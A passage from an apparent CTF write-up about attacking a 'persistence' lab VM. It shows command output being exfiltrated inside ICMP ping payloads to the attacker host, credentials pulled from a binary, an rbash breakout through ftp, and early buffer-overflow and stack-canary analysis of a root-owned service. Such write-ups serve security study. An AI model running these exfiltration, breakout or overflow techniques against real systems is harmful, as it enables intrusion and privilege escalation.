+    0x0040:  <span style="color:#bd93f9">3439</span> <span style="color:#bd93f9">3828</span> 6e67 696e <span style="color:#bd93f9">7829</span> <span style="color:#bd93f9">2067</span> <span style="color:#bd93f9">7569</span> 643d  498<span style="color:#ff79c6">(</span>nginx<span style="color:#ff79c6">)</span>.guid<span style="color:#ff79c6">=</span>
+    0x0050:  <span style="color:#bd93f9">3439</span> <span style="color:#bd93f9">3828</span>                                498<span style="color:#ff79c6">(</span>
+09:18:14.440365 IP 192.168.56.104 &gt; 192.168.56.102: ICMP <span style="color:#8be9fd;font-style:italic">echo</span> request, id 7176, seq 1, length <span style="color:#bd93f9">64</span>
+    0x0000:  <span style="color:#bd93f9">4500</span> <span style="color:#bd93f9">0054</span> <span style="color:#bd93f9">0000</span> <span style="color:#bd93f9">4000</span> <span style="color:#bd93f9">4001</span> 488a c0a8 <span style="color:#bd93f9">3868</span>  E..T..@.@.H...8h
+    0x0010:  c0a8 <span style="color:#bd93f9">3866</span> <span style="color:#bd93f9">0800</span> 318a 1c08 <span style="color:#bd93f9">0001</span> 56a3 1a54  ..8f..1.....V..T
+    0x0020:  e35a 0a00 <span style="color:#bd93f9">6769</span> 6e78 <span style="color:#bd93f9">2920</span> <span style="color:#bd93f9">6772</span> <span style="color:#bd93f9">6964</span> 3d34  .Z..ginx<span style="color:#ff79c6">)</span>.grid<span style="color:#ff79c6">=</span><span style="color:#bd93f9">4</span>
+    0x0030:  <span style="color:#bd93f9">3938</span> 286e <span style="color:#bd93f9">6769</span> 6e78 <span style="color:#bd93f9">2920</span> <span style="color:#bd93f9">6772</span> <span style="color:#bd93f9">6964</span> 3d34  98<span style="color:#ff79c6">(</span>nginx<span style="color:#ff79c6">)</span>.grid<span style="color:#ff79c6">=</span><span style="color:#bd93f9">4</span>
+    0x0040:  <span style="color:#bd93f9">3938</span> 286e <span style="color:#bd93f9">6769</span> 6e78 <span style="color:#bd93f9">2920</span> <span style="color:#bd93f9">6772</span> <span style="color:#bd93f9">6964</span> 3d34  98<span style="color:#ff79c6">(</span>nginx<span style="color:#ff79c6">)</span>.grid<span style="color:#ff79c6">=</span><span style="color:#bd93f9">4</span>
+    0x0050:  <span style="color:#bd93f9">3938</span> 286e                                98<span style="color:#ff79c6">(</span>n
+09:18:14.440382 IP 192.168.56.102 &gt; 192.168.56.104: ICMP <span style="color:#8be9fd;font-style:italic">echo</span> reply, id 7176, seq 1, length <span style="color:#bd93f9">64</span>
+    0x0000:  <span style="color:#bd93f9">4500</span> <span style="color:#bd93f9">0054</span> a04a <span style="color:#bd93f9">0000</span> <span style="color:#bd93f9">4001</span> e83f c0a8 <span style="color:#bd93f9">3866</span>  E..T.J..@..?..8f
+    0x0010:  c0a8 <span style="color:#bd93f9">3868</span> <span style="color:#bd93f9">0000</span> 398a 1c08 <span style="color:#bd93f9">0001</span> 56a3 1a54  ..8h..9.....V..T
+    0x0020:  e35a 0a00 <span style="color:#bd93f9">6769</span> 6e78 <span style="color:#bd93f9">2920</span> <span style="color:#bd93f9">6772</span> <span style="color:#bd93f9">6964</span> 3d34  .Z..ginx<span style="color:#ff79c6">)</span>.grid<span style="color:#ff79c6">=</span><span style="color:#bd93f9">4</span>
+    0x0030:  <span style="color:#bd93f9">3938</span> 286e <span style="color:#bd93f9">6769</span> 6e78 <span style="color:#bd93f9">2920</span> <span style="color:#bd93f9">6772</span> <span style="color:#bd93f9">6964</span> 3d34  98<span style="color:#ff79c6">(</span>nginx<span style="color:#ff79c6">)</span>.grid<span style="color:#ff79c6">=</span><span style="color:#bd93f9">4</span>
+    0x0040:  <span style="color:#bd93f9">3938</span> 286e <span style="color:#bd93f9">6769</span> 6e78 <span style="color:#bd93f9">2920</span> <span style="color:#bd93f9">6772</span> <span style="color:#bd93f9">6964</span> 3d34  98<span style="color:#ff79c6">(</span>nginx<span style="color:#ff79c6">)</span>.grid<span style="color:#ff79c6">=</span><span style="color:#bd93f9">4</span>
+    0x0050:  <span style="color:#bd93f9">3938</span> 286e                                98<span style="color:#ff79c6">(</span>n
+09:18:14.441191 IP 192.168.56.104 &gt; 192.168.56.102: ICMP <span style="color:#8be9fd;font-style:italic">echo</span> request, id 7432, seq 1, length <span style="color:#bd93f9">64</span>
+    0x0000:  <span style="color:#bd93f9">4500</span> <span style="color:#bd93f9">0054</span> <span style="color:#bd93f9">0000</span> <span style="color:#bd93f9">4000</span> <span style="color:#bd93f9">4001</span> 488a c0a8 <span style="color:#bd93f9">3868</span>  E..T..@.@.H...8h
+    0x0010:  c0a8 <span style="color:#bd93f9">3866</span> <span style="color:#bd93f9">0800</span> ed92 1d08 <span style="color:#bd93f9">0001</span> 56a3 1a54  ..8f........V..T
+    0x0020:  f95d 0a00 286e <span style="color:#bd93f9">6769</span> 6e78 290a 6f75 <span style="color:#bd93f9">7073</span>  .<span style="color:#ff79c6">]</span>..<span style="color:#ff79c6">(</span>nginx<span style="color:#ff79c6">)</span>.oups
+    0x0030:  3d34 <span style="color:#bd93f9">3938</span> 286e <span style="color:#bd93f9">6769</span> 6e78 290a 6f75 <span style="color:#8be9fd;font-style:italic">7073</span>  <span style="color:#ff79c6">=</span>498<span style="color:#ff79c6">(</span>nginx<span style="color:#ff79c6">)</span>.oups
+    0x0040:  3d34 <span style="color:#bd93f9">3938</span> 286e <span style="color:#bd93f9">6769</span> 6e78 290a 6f75 <span style="color:#8be9fd;font-style:italic">7073</span>  <span style="color:#ff79c6">=</span>498<span style="color:#ff79c6">(</span>nginx<span style="color:#ff79c6">)</span>.oups
+    0x0050:  3d34 <span style="color:#8be9fd;font-style:italic">3938</span>                                <span style="color:#ff79c6">=</span><span style="color:#bd93f9">498</span>
+09:18:14.441198 IP 192.168.56.102 &gt; 192.168.56.104: ICMP <span style="color:#8be9fd;font-style:italic">echo</span> reply, id 7432, seq 1, length <span style="color:#bd93f9">64</span>
+    0x0000:  <span style="color:#bd93f9">4500</span> <span style="color:#bd93f9">0054</span> a04b <span style="color:#bd93f9">0000</span> <span style="color:#bd93f9">4001</span> e83e c0a8 <span style="color:#bd93f9">3866</span>  E..T.K..@..&gt;..8f
+    0x0010:  c0a8 <span style="color:#bd93f9">3868</span> <span style="color:#bd93f9">0000</span> f592 1d08 <span style="color:#bd93f9">0001</span> 56a3 1a54  ..8h........V..T
+    0x0020:  f95d 0a00 286e <span style="color:#bd93f9">6769</span> 6e78 290a 6f75 <span style="color:#bd93f9">7073</span>  .<span style="color:#ff79c6">]</span>..<span style="color:#ff79c6">(</span>nginx<span style="color:#ff79c6">)</span>.oups
+    0x0030:  3d34 <span style="color:#bd93f9">3938</span> 286e <span style="color:#bd93f9">6769</span> 6e78 290a 6f75 <span style="color:#8be9fd;font-style:italic">7073</span>  <span style="color:#ff79c6">=</span>498<span style="color:#ff79c6">(</span>nginx<span style="color:#ff79c6">)</span>.oups
+    0x0040:  3d34 <span style="color:#bd93f9">3938</span> 286e <span style="color:#bd93f9">6769</span> 6e78 290a 6f75 <span style="color:#8be9fd;font-style:italic">7073</span>  <span style="color:#ff79c6">=</span>498<span style="color:#ff79c6">(</span>nginx<span style="color:#ff79c6">)</span>.oups
+    0x0050:  3d34 <span style="color:#8be9fd;font-style:italic">3938</span>                                <span style="color:#ff79c6">=</span><span style="color:#bd93f9">498</span>
+</code></pre></div><p>Mind. Blown.</p>
+<p>In case you don&rsquo;t see it, we have extracts of the <code>id</code> command in the request/response packets like <em>98(nginx).grid=4</em>. While this is not really fun to decipher, and with commands that produce a lot of output even worse, it was in fact <strong>something</strong> to work with!</p>
+<p>I fiddled around with this for a little while longer, trying to make the output a little more readable. Eventually I fired up scapy and just printed the data section of the packet. Not much better, but with a little more effort I am sure you can get something very workable out of it.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#ff79c6">&gt;&gt;&gt;</span> sniff(<span style="color:#8be9fd;font-style:italic">filter</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;icmp[icmptype] == 8 and host 192.168.56.104&#34;</span>, prn<span style="color:#ff79c6">=</span><span style="color:#ff79c6">lambda</span> x: x<span style="color:#ff79c6">.</span>load)
+ؤT�nginx) guid<span style="color:#ff79c6">=</span><span style="color:#bd93f9">498</span>(nginx) guid<span style="color:#ff79c6">=</span><span style="color:#bd93f9">498</span>(nginx) guid<span style="color:#ff79c6">=</span><span style="color:#bd93f9">498</span>(
+ؤT
+   ginx) grid<span style="color:#ff79c6">=</span><span style="color:#bd93f9">498</span>(nginx) grid<span style="color:#ff79c6">=</span><span style="color:#bd93f9">498</span>(nginx) grid<span style="color:#ff79c6">=</span><span style="color:#bd93f9">498</span>(n
+ؤT�(nginx)
+oups<span style="color:#ff79c6">=</span><span style="color:#bd93f9">498</span>(nginx)
+oups<span style="color:#ff79c6">=</span><span style="color:#bd93f9">498</span>(nginx)
+oups<span style="color:#ff79c6">=</span><span style="color:#bd93f9">498</span>
+</code></pre></div><h2 id="sysadmin-tool">sysadmin-tool</h2>
+<p>So with actual output to work with, I can almost say I have shell, however, it&rsquo;s crap. Here I had many options to go for. Do I try and get one of those ping tunnels up to shell with? Or something else.</p>
+<p>At one stage I ran <code>ls</code> as the command trying to see if there was anything in the web path that I may not have found yet. A file called <em>sysadmin-tool</em> was revealed. I browsed to the file which pushed it as a download for me, and saved it locally. I then ran the bin through <code>strings</code>:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:~# strings sysadmin-tool
+/lib/ld-linux.so.2
+__gmon_start__
+libc.so.6
+_IO_stdin_used
+chroot
+strncmp
+puts
+setreuid
+mkdir
+rmdir
+chdir
+system
+__libc_start_main
+GLIBC_2.0
+PTRh
+<span style="color:#ff79c6">[</span>^_<span style="color:#ff79c6">]</span>
+Usage: sysadmin-tool --activate-service
+--activate-service
+breakout
+/bin/sed -i <span style="color:#f1fa8c">&#39;s/^#//&#39;</span> /etc/sysconfig/iptables
+/sbin/iptables-restore &lt; /etc/sysconfig/iptables
+Service started...
+Use avida:dollars to access.
+/nginx/usr/share/nginx/html/breakout
+</code></pre></div><p>From this alone we can deduce that when run, it may modify the firewall. It also looks like it contains some credentials, so I took note of those too. I then tried to run the command, followed by a nmap scan:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">;./sysadmin-tool --activate-service| xxd -p -c <span style="color:#bd93f9">16</span> | <span style="color:#ff79c6">while</span> <span style="color:#8be9fd;font-style:italic">read</span> line; <span style="color:#ff79c6">do</span> ping -p <span style="color:#8be9fd;font-style:italic">$line</span> -c <span style="color:#bd93f9">1</span> -q 192.168.56.102; <span style="color:#ff79c6">done</span>
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:~# nmap 192.168.56.104 --reason -sV -p-
+
+Starting Nmap 6.46 <span style="color:#ff79c6">(</span> http://nmap.org <span style="color:#ff79c6">)</span> at 2014-09-18 09:46 SAST
+Nmap scan report <span style="color:#ff79c6">for</span> 192.168.56.104
+Host is up, received reset <span style="color:#ff79c6">(</span>0.0017s latency<span style="color:#ff79c6">)</span>.
+Not shown: <span style="color:#bd93f9">65533</span> filtered ports
+Reason: <span style="color:#bd93f9">65533</span> no-responses
+PORT   STATE SERVICE REASON  VERSION
+22/tcp open  ssh     syn-ack OpenSSH 5.3 <span style="color:#ff79c6">(</span>protocol 2.0<span style="color:#ff79c6">)</span>
+80/tcp open  http    syn-ack nginx 1.4.7
+
+Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
+Nmap <span style="color:#ff79c6">done</span>: <span style="color:#bd93f9">1</span> IP address <span style="color:#ff79c6">(</span><span style="color:#bd93f9">1</span> host up<span style="color:#ff79c6">)</span> scanned in 6637.05 seconds
+</code></pre></div><p>Yay! SSH.</p>
+<h2 id="shell-and-breakout-as-avida">shell and breakout as avida</h2>
+<p>Using the information that looked like credentials retrieved in the previous section, I proceeded to SSH into the server:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:~/Desktop/persistence# ssh avida@192.168.56.104
+The authenticity of host <span style="color:#f1fa8c">&#39;192.168.56.104 (192.168.56.104)&#39;</span> can<span style="color:#f1fa8c">&#39;t be established.
+</span><span style="color:#f1fa8c">RSA key fingerprint is 37:22:da:ba:ef:05:1f:77:6a:30:6f:61:56:7b:47:54.
+</span><span style="color:#f1fa8c">Are you sure you want to continue connecting (yes/no)? yes
+</span><span style="color:#f1fa8c">Warning: Permanently added &#39;</span>192.168.56.104<span style="color:#f1fa8c">&#39; (RSA) to the list of known hosts.
+</span><span style="color:#f1fa8c">avida@192.168.56.104&#39;</span>s password:    <span style="color:#6272a4"># dollars</span>
+Last login: Thu Sep <span style="color:#bd93f9">18</span> 05:57:30 <span style="color:#bd93f9">2014</span>
+-rbash-4.1$
+</code></pre></div><p>Op success. Or is it? I immediately noticed the prompt as <code>rbash</code>, aka restricted bash. :( Having a look around, I was in fact very limited to what I can do. Most annoyingly, I was unable to run commands with a <code>/</code> in them.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">-rbash-4.1$ /bin/bash
+-rbash: /bin/bash: restricted: cannot specify <span style="color:#f1fa8c">`</span>/&#39; in <span style="color:#8be9fd;font-style:italic">command</span> names
+</code></pre></div><p>So the next logical step was to attempt &lsquo;breaking out&rsquo; of this shell so that I can have a better look around. I was able to cat say <code>/etc/passwd</code>, but that only gets you <em>that</em> far :P</p>
+<p>After quite some time and some research, it became apparent that the well known breakouts from rbash are not possible.  I was unable to edit my PATH, change files and re-login or use the classic <code>vi</code> <code>:shell</code> breakout. Eventually (and out of desperation), I focussed my attention to <code>ftp</code>. Opening <code>ftp</code>, and typing <code>help</code> at the prompt, I studied each available command carefully. In the list was a exclamation mark(!), which I typed and pressed enter:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">-rbash-4.1$ ftp
+ftp&gt; !
++rbash-4.1$ /bin/bash
+bash-4.1$
+</code></pre></div><p>I got dropped into another <code>rbash</code> shell, however this time with a +. So, I went for <code>/bin/bash</code> and&hellip; w00t? I exported a new PATH to my environment, and all of those annoying rbash restrictions were gone. Thank goodness!</p>
+<h2 id="the-wopr-game">the wopr game</h2>
+<p>During the enumeration done while still stuck with <code>rbash</code>, I noticed that the machine was listening for connections on tcp/3333 locally when inspecting the output of <code>netstat</code>. Opening a telnet session to this port presented you with a &lsquo;game&rsquo;:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bash-4.1$ telnet 127.0.0.1 <span style="color:#bd93f9">3333</span>
+Trying 127.0.0.1...
+Connected to 127.0.0.1.
+Escape character is <span style="color:#f1fa8c">&#39;^]&#39;</span>.
+<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> hello, my name is sploitable
+<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> would you like to play a game?
+&gt; yes!
+<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> yeah, I don&#39;t think so
+<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> bye!
+Connection closed by foreign host.
+bash-4.1$
+</code></pre></div><p>I asked really, really nicely, but no matter how polite I was, it would just not let me play!</p>
+<p>Further inspection showed that the game was possibly run as root from <code>/usr/local/bin/wopr</code></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bash-4.1$ ps -ef | grep wopr
+root      <span style="color:#bd93f9">1005</span>     <span style="color:#bd93f9">1</span>  <span style="color:#bd93f9">0</span> 05:42 ?        00:00:00 /usr/local/bin/wopr
+root      <span style="color:#bd93f9">1577</span>  <span style="color:#bd93f9">1005</span>  <span style="color:#bd93f9">0</span> 06:43 ?        00:00:00 <span style="color:#ff79c6">[</span>wopr<span style="color:#ff79c6">]</span> &lt;defunct&gt;
+avida     <span style="color:#bd93f9">1609</span>  <span style="color:#bd93f9">1501</span>  <span style="color:#bd93f9">0</span> 06:47 pts/0    00:00:00 grep wopr
+
+bash-4.1$ ls -lah /usr/local/bin/wopr
+-rwxr-xr-x. <span style="color:#bd93f9">1</span> root root 7.7K Apr <span style="color:#bd93f9">28</span> 07:43 /usr/local/bin/wopr
+</code></pre></div><p><code>wopr</code> was also readable to me which was great news! I decided to get a copy of the binary onto my local Kali Linux box, and take a closer look at the internals:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#6272a4"># first, hex encode the file</span>
+bash-4.1$ xxd -p -c <span style="color:#bd93f9">36</span> /usr/local/bin/wopr
+7f454c460101010000000000000000000200030001000000c08604083400000080110000
+0000000034002000090028001e001b000600000034000000348004083480040820010000
+<span style="color:#ff79c6">[</span>... snip ...<span style="color:#ff79c6">]</span>
+38362e6765745f70635f7468756e6b2e6278006d61696e005f696e697400
+bash-4.1$
+
+<span style="color:#6272a4"># next, I copied the xxd output from the persistence terminal</span>
+<span style="color:#6272a4"># and pasted it into a file called wopr.xxd. Then reverted it</span>
+<span style="color:#6272a4"># and redirected the output to `wopr`</span>
+root@kali:~# cat wopr.xxd | xxd -r -p &gt; wopr
+</code></pre></div><p>The idea was to see if there may be a way to exploit this program so that I can execute some commands using it. It is running as root after all&hellip;</p>
+<h2 id="wopr-stack-smashing">wopr, stack smashing</h2>
+<p>Poking around the binary, I mostly used <code>gdb</code> along with <a href="https://github.com/longld/peda">peda</a>.
+Checksec revealed that this binary was compiled with quite a few security features built in.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:~# gdb -q ./wopr
+Reading symbols from persistence/wopr...<span style="color:#ff79c6">(</span>no debugging symbols found<span style="color:#ff79c6">)</span>...done.
+gdb-peda$ checksec
+CANARY    : ENABLED
+FORTIFY   : disabled
+NX        : ENABLED
+PIE       : disabled
+RELRO     : Partial
+</code></pre></div><p>Digesting the above output should bring us to a few conclusions. A stack canary is present, meaning if we corrupt memory, and dont have a correct canary, the binary may terminate itself as a protection mechanism once it detects the incorrect canary. Secondly, the binary is compiled to mark the stack as non executable. Any potential shellcode that we write here will not be executed. Lastly, the GOT relocation is set to read only, meaning function locations are resolved at the beginning of execution and the GOT is then marked as read only resulting in the inability to rewrite plt type lookups.</p>
+<p>With all of that in mind, I ran the binary with the <code>r</code> command, and made a new telnet session to it.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gdb-peda$ r
+<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> <span style="color:#8be9fd;font-style:italic">bind</span> <span style="color:#8be9fd;font-style:italic">complete</span>
+<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> waiting <span style="color:#ff79c6">for</span> connections
+<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> logging queries to <span style="color:#8be9fd;font-style:italic">$TMPLOG</span>
+<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> got a connection
+<span style="color:#ff79c6">[</span>New process 26936<span style="color:#ff79c6">]</span>
+<span style="color:#ff79c6">[</span>Inferior <span style="color:#bd93f9">2</span> <span style="color:#ff79c6">(</span>process 26936<span style="color:#ff79c6">)</span> exited normally<span style="color:#ff79c6">]</span>
+Warning: not running or target is remote
+gdb-peda$
+</code></pre></div><p>When the new connection came in, a notice of a new process appears. Disassembling the main function gives us an indication that the process is doing a <code>fork()</code></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gdb-peda$ disass main
+Dump of assembler code <span style="color:#ff79c6">for</span> <span style="color:#ff79c6">function</span> main:
+    <span style="color:#ff79c6">[</span>.. snip ..<span style="color:#ff79c6">]</span>
+   0x080489fd &lt;+543&gt;:   mov    DWORD PTR <span style="color:#ff79c6">[</span>esp<span style="color:#ff79c6">]</span>,0x8048cb2
+   0x08048a04 &lt;+550&gt;:   call   0x804866c &lt;puts@plt&gt;
+   0x08048a09 &lt;+555&gt;:   call   0x804867c &lt;fork@plt&gt; <span style="color:#6272a4"># &lt;--</span>
+   0x08048a0e &lt;+560&gt;:   <span style="color:#8be9fd;font-style:italic">test</span>   eax,eax
+   0x08048a10 &lt;+562&gt;:   jne    0x8048b0e &lt;main+816&gt;
+   0x08048a16 &lt;+568&gt;:   mov    DWORD PTR <span style="color:#ff79c6">[</span>esp+0x8<span style="color:#ff79c6">]</span>,0x21
+   0x08048a1e &lt;+576&gt;:   mov    DWORD PTR <span style="color:#ff79c6">[</span>esp+0x4<span style="color:#ff79c6">]</span>,0x8048cc8
+   0x08048a26 &lt;+584&gt;:   mov    eax,DWORD PTR <span style="color:#ff79c6">[</span>ebp-0x22c<span style="color:#ff79c6">]</span>
+   0x08048a2c &lt;+590&gt;:   mov    DWORD PTR <span style="color:#ff79c6">[</span>esp<span style="color:#ff79c6">]</span>,eax
+   0x08048a2f &lt;+593&gt;:   call   0x804858c &lt;write@plt&gt;
+    <span style="color:#ff79c6">[</span>.. snip ..<span style="color:#ff79c6">]</span>
+End of assembler dump.
+gdb-peda$
+</code></pre></div><p>Why is the <code>fork()</code> so important!? We will see in a bit just hang on. :)</p>
+<p>So back to fuzzing wopr, I proceeded to send some arbtritary input via the telnet session. I noticed once I had sent more than 30 characters as input, wopr would freak out! This is a good freak out btw :D</p>
+<p>Sending 30 x A&rsquo;s results in:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gdb-peda$ <span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> got a connection
+*** stack smashing detected ***: wopr <span style="color:#8be9fd;font-style:italic">terminated</span>
+<span style="color:#ff79c6">=======</span> Backtrace: <span style="color:#ff79c6">=========</span>
+/lib/i386-linux-gnu/libc.so.6<span style="color:#ff79c6">(</span>__fortify_fail+0x40<span style="color:#ff79c6">)[</span>0xb7f5ebb0<span style="color:#ff79c6">]</span>
+/lib/i386-linux-gnu/libc.so.6<span style="color:#ff79c6">(</span>+0xeab6a<span style="color:#ff79c6">)[</span>0xb7f5eb6a<span style="color:#ff79c6">]</span>
+wopr<span style="color:#ff79c6">[</span>0x80487dc<span style="color:#ff79c6">]</span>
+wopr<span style="color:#ff79c6">[</span>0x8048ad6<span style="color:#ff79c6">]</span>
+/lib/i386-linux-gnu/libc.so.6<span style="color:#ff79c6">(</span>__libc_start_main+0xe6<span style="color:#ff79c6">)[</span>0xb7e8ae36<span style="color:#ff79c6">]</span>
+wopr<span style="color:#ff79c6">[</span>0x80486e1<span style="color:#ff79c6">]</span>
+<span style="color:#ff79c6">=======</span> Memory map: <span style="color:#ff79c6">========</span>
+08048000-08049000 r-xp <span style="color:#bd93f9">00000000</span> 08:01 <span style="color:#bd93f9">1184792</span>    wopr
+08049000-0804a000 r--p <span style="color:#bd93f9">00000000</span> 08:01 <span style="color:#bd93f9">1184792</span>    wopr
+0804a000-0804b000 rw-p <span style="color:#bd93f9">00001000</span> 08:01 <span style="color:#bd93f9">1184792</span>    wopr
+0804b000-0806c000 rw-p <span style="color:#bd93f9">00000000</span> 00:00 <span style="color:#bd93f9">0</span>          <span style="color:#ff79c6">[</span>heap<span style="color:#ff79c6">]</span>
+b7e3b000-b7e57000 r-xp <span style="color:#bd93f9">00000000</span> 08:01 <span style="color:#bd93f9">1573598</span>    /lib/i386-linux-gnu/libgcc_s.so.1
+b7e57000-b7e58000 rw-p 0001b000 08:01 <span style="color:#bd93f9">1573598</span>    /lib/i386-linux-gnu/libgcc_s.so.1
+b7e73000-b7e74000 rw-p <span style="color:#bd93f9">00000000</span> 00:00 <span style="color:#bd93f9">0</span>
+b7e74000-b7fbd000 r-xp <span style="color:#bd93f9">00000000</span> 08:01 <span style="color:#bd93f9">1580474</span>    /lib/i386-linux-gnu/libc-2.13.so
+b7fbd000-b7fbe000 ---p <span style="color:#bd93f9">00149000</span> 08:01 <span style="color:#bd93f9">1580474</span>    /lib/i386-linux-gnu/libc-2.13.so
+b7fbe000-b7fc0000 r--p <span style="color:#bd93f9">00149000</span> 08:01 <span style="color:#bd93f9">1580474</span>    /lib/i386-linux-gnu/libc-2.13.so
+b7fc0000-b7fc1000 rw-p 0014b000 08:01 <span style="color:#bd93f9">1580474</span>    /lib/i386-linux-gnu/libc-2.13.so
+b7fc1000-b7fc4000 rw-p <span style="color:#bd93f9">00000000</span> 00:00 <span style="color:#bd93f9">0</span>
+b7fde000-b7fe1000 rw-p <span style="color:#bd93f9">00000000</span> 00:00 <span style="color:#bd93f9">0</span>
+b7fe1000-b7fe2000 r-xp <span style="color:#bd93f9">00000000</span> 00:00 <span style="color:#bd93f9">0</span>          <span style="color:#ff79c6">[</span>vdso<span style="color:#ff79c6">]</span>
+b7fe2000-b7ffe000 r-xp <span style="color:#bd93f9">00000000</span> 08:01 <span style="color:#bd93f9">1579852</span>    /lib/i386-linux-gnu/ld-2.13.so
+b7ffe000-b7fff000 r--p 0001b000 08:01 <span style="color:#bd93f9">1579852</span>    /lib/i386-linux-gnu/ld-2.13.so
+b7fff000-b8000000 rw-p 0001c000 08:01 <span style="color:#bd93f9">1579852</span>    /lib/i386-linux-gnu/ld-2.13.so
+bffdf000-c0000000 rw-p <span style="color:#bd93f9">00000000</span> 00:00 <span style="color:#bd93f9">0</span>          <span style="color:#ff79c6">[</span>stack<span style="color:#ff79c6">]</span>
+</code></pre></div><p>So it looks like we may have a <a href="http://en.wikipedia.org/wiki/Stack_buffer_overflow">buffer overflow</a> here. What is important though is the backtrace shows that the last fail was in <code>__fortify_fail</code>. <code>__fortify_fail</code> is normally just a error reporter, as was called because the stack cookie check failed. Remember the CANARY we detected earlier with the <code>checksec</code> output? With that knowledge, is almost safe to assume that byte 30 is where the stack canary starts. This means that if we want to corrupt more memory further up the stack (which is what we want actually), we need to find a way to know what the canary value is.</p>
+<p>But lets not stop there. I continued to place more A&rsquo;s into the input until at byte 39 I noticed 41 (hex for A) in the backtrace. By the time I had 42 A&rsquo;s, the backtrace had a full 4 bytes of 41.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> got a connection
+*** stack smashing detected ***: wopr <span style="color:#8be9fd;font-style:italic">terminated</span>
+<span style="color:#ff79c6">=======</span> Backtrace: <span style="color:#ff79c6">=========</span>
+/lib/i386-linux-gnu/libc.so.6<span style="color:#ff79c6">(</span>__fortify_fail+0x40<span style="color:#ff79c6">)[</span>0xb7f5ebb0<span style="color:#ff79c6">]</span>
+/lib/i386-linux-gnu/libc.so.6<span style="color:#ff79c6">(</span>+0xeab6a<span style="color:#ff79c6">)[</span>0xb7f5eb6a<span style="color:#ff79c6">]</span>
+wopr<span style="color:#ff79c6">[</span>0x80487dc<span style="color:#ff79c6">]</span>
+<span style="color:#ff79c6">[</span>0x41414141<span style="color:#ff79c6">]</span>        <span style="color:#6272a4">#&lt;-- EIP?</span>
+</code></pre></div><p>Was this where EIP was?
+With the debugging we have done thus far, lets assume that the stack layout looks something like this:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">- -&gt;         - -&gt;        [42 Bytes  in Total]        - -&gt;         - &gt;
+
+[        30 Bytes Data         ] [  Cookie  ] [  4 Bytes  ] [  EIP  ]
+
+- -&gt;         - -&gt;        [42 Bytes  in Total]        - -&gt;         - &gt;
+</code></pre></div><h2 id="wopr---stack-canary-bruteforce">wopr - stack canary bruteforce</h2>
+<p>This part of the challenge took me the second longest to nail. I have zero knowledge of stack cookies, let alone experience in bypassing them. So I had to pack out my best Google-fu abilities and learn all I can about bypassing these cookies.</p>
+<p>A lot was learnt here. The 3 primary resources that really helped me get the ball rolling into something workable was</p>
+<ul>
+<li><a href="http://phrack.org/issues/67/13.html">Phrack Issue 67</a></li>
+<li><a href="http://fluxius.handgrep.se/2011/10/20/the-art-of-elf-analysises-and-exploitations/">The Art Of ELF: Analysis and Exploitations</a></li>
+<li><a href="http://www.pwntester.com/blog/2013/12/31/fusion-level04-write-up/">Fusion level04 write-up</a> (SPOILER ALERTS for another CTF)</li>
+</ul>
+<p>Now, remember I mentioned <code>fork()</code> earlier on? From the Phrack article, we can read some interesting ideas about binaries that make use of <code>fork()</code> and how this affects stack cookies.</p>
+<p>From <code>man 2 fork</code>&rsquo;s description:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">DESCRIPTION
